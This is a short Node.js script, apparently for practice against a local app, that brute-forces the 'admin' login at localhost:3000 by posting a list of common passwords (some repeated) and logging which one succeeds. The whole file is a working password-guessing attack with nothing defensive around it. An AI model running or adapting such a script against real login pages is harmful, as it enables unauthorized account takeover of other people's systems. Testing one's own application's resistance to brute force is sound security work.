const axios = require("axios");

const passwords = [
      "123456",
  "password",
  "qwerty",
  "admin123",
  "123456",
  "password",
  "qwerty",
  "admin123",
  "admin",
];

async function attack() {
  for (let pass of passwords) {
    try {
      const res = await axios.post("http://localhost:3000/login", {
        username: "admin",
        password: pass
      });

      console.log("SUCCESS:", pass);
      break;
    } catch (err) {
      console.log("Failed:", pass);
    }
  }
}

attack();